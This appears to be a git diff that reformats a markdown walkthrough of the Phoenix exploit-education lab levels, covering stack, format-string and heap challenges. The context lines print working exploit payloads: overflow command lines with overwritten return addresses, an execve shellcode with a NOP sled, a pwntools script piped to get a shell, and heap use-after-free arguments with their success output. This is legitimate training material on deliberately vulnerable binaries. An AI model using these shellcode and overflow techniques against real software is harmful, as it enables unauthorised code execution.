@@ -26,7 +26,7 @@ python -c 'print("A"*70)' | ./stack_zero
    strcpy(locals.buffer, argv[1]);
   ```
   
-  ==Note==: The file takes the input as the argument so we can not pass as the pipe it will give us the error instead we will do this:
+  **Note**: The file takes the input as the argument so we can not pass as the pipe it will give us the error instead we will do this:
   ```
   /stack-one $(python -c 'print("A" * 65 + "\x62\x59\x6c\x49")')
   
@@ -119,23 +119,23 @@ int main(int argc, char **argv) {
   3- lastly the shell will execute.
 
 - Procedure of Payload creation:
-		1- first copy a shell code from the internet and convert it into little endian hex format:
-   		```
-	'\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff' \
-	'\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'	
-	```
+	1- first copy a shell code from the internet and convert it into little endian hex format:
+  		```
+		'\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff' \
+		'\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'	
+		```
 		2- In the begining of the buffer according to your choice add the NOP -> No operation in the stack:
 			```
-		'\x90' * 30 // here hex for NOP is \x90 and 30 is number of times we want to insert it.
-		```
+			'\x90' * 30 // here hex for NOP is \x90 and 30 is number of times we want to insert it.
+			```
 		3- after adding the NOP now add the shellcode which is defined previously.
 		4- The Purpose of NOP is to make the shell land where we want to land it and exclude any discrepancy which comes 
 		in the way.
 		5- keep in the view that total lenth of buffer is 128, of which we 30 has been defined for the NOP operators.
 		6- after the NOP code and shellcode, add the buffer over flow script which is:
 			```
-		python -c 'print("A" * 98)' // we are multipling it with 98 because 30 are already allocated.
-		```
+			python -c 'print("A" * 98)' // we are multipling it with 98 because 30 are already allocated.
+			```
 		7- At last overwrite the value of RBP buffer to 8 bit digits as BBBBBBBB.
 		8- open the executable in the gdb and set the break point after the gets() function in the 
 		start_level function.
@@ -143,8 +143,11 @@ int main(int argc, char **argv) {
 		```
 		run < <(python payload.py)
 		```
-		10- open the info frame and see where is the start_level function will return after the excution:
-		```
+
+  10- open the info frame and see where is the start_level function will return after the excution:
+
+  
+		```  
 		gef> info frame
 		Stack level 0, frame at 0x7fffffffe520:
 		rip = 0x4005a1 in start_level; saved rip = 0x7fffffffe480
@@ -153,11 +156,12 @@ int main(int argc, char **argv) {
 		Locals at 0x7fffffffe510, Previous frame's sp is 0x7fffffffe520
 		Saved registers:
 		rbp at 0x7fffffffe510, rip at 0x7fffffffe518
-
 		```
-			- here is the saved rip = 0x7fffffffe480 is where the start_level will return 
-		11- Use the pwn tool 
+
+- here is the saved rip = 0x7fffffffe480 is where the start_level will return 
+11- Use the pwn tool 
 	
+
 
 		```
 			from pwn import *
@@ -176,18 +180,10 @@ int main(int argc, char **argv) {
 
 		```
 
-To run the code:
+- To run the code:
 ```
 (python payload.py; cat) | /opt/phoenix/amd64/stack-five
 ```
-
-
-
----
-
-
----
-
 
 ---
 
@@ -256,7 +252,7 @@ To run the code:
 	  user@phoenix-amd64:~$ nm /opt/phoenix/i486/format-three | grep changeme
 	  08049844 B changeme
 	  
-	  ```
+	```
   2- crafting a payload:
   
   ```
@@ -388,11 +384,11 @@ from pwn import *
 
 ## Heap-Zero
 
-	- The heap-zero challenge requires the understanding of UAF heap vulnerability in which the freed malloc object is 
-	used again.
-	- Freed malloc object can be used to redirect to call the intended function which we want to call.
-	- In this particular challenge we have to overflow the heap upto 72 bytes on the 32 bit machine in order to 
-	reach out to the desired location and then add the address of the function which want to call.
+- The heap-zero challenge requires the understanding of UAF heap vulnerability in which the freed malloc object is 
+used again.
+- Freed malloc object can be used to redirect to call the intended function which we want to call.
+- In this particular challenge we have to overflow the heap upto 72 bytes on the 32 bit machine in order to 
+reach out to the desired location and then add the address of the function which want to call.
 	
 	```
 	user@phoenix-amd64:~$ /opt/phoenix/i486/heap-zero $(python -c "print 'A'*72 + '\x35\x88\x04\x08'") 
@@ -416,7 +412,7 @@ from pwn import *
   4- The offset required to exploit the vulnerability is 20 for first argument.
   
   
-  ```sh
+  ```
   
   user@phoenix-amd64:~$ /opt/phoenix/i486/heap-one  $(python -c "print 'A'*20 + '\x40\xc1\x04\x08'") $(python -c "print '\x9a\x88\x04\x08'")
   Congratulations, you've completed this level @ 1750751291 seconds past the Epoch
@@ -435,7 +431,7 @@ Exploitation:
 	- We have to flow the pattern defined in code:
 	
 	
-	```sh
+	```
 	
 	user@phoenix-amd64:~$ /opt/phoenix/i486/heap-two 
 	Welcome to phoenix/heap-two, brought to you by https://exploit.education
@@ -453,10 +449,10 @@ Exploitation:
 
 	```
 	
-	- After everthing is reset the malloc is freed
-	- and the freed memory is allocated to the **service**.
-	- at last when the user logged it will be checking the previous memory.
-	- if we have provided with the same characters as login it will give **You are already Logged In!**.
+- After everthing is reset the malloc is freed
+- and the freed memory is allocated to the **service**.
+- at last when the user logged it will be checking the previous memory.
+- if we have provided with the same characters as login it will give **You are already Logged In!**.
 
 ## Heap-Three:
 ### **Exploiting Doug Lea's Malloc (dlmalloc) with Unlink Attack**  
